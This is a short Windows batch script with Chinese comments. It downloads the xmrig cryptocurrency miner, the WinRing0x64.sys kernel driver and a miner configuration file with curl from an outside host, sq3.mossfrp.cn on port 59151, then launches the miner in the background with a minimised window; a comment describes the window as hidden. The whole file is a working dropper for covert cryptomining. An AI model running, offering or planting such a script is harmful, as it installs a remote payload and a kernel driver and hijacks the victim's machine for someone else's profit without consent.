@echo off
REM 下载xmrig.exe
curl -o xmrig.exe http://sq3.mossfrp.cn:59151/xmrig.exe

REM 下载WinRing0x64.sys
curl -o WinRing0x64.sys http://sq3.mossfrp.cn:59151/WinRing0x64.sys

REM 下载config.json
curl -o config.json http://sq3.mossfrp.cn:59151/config.json

REM 启动cmd.exe进程，窗口样式为隐藏
start /B /MIN xmrig.exe

REM 脚本结束
exit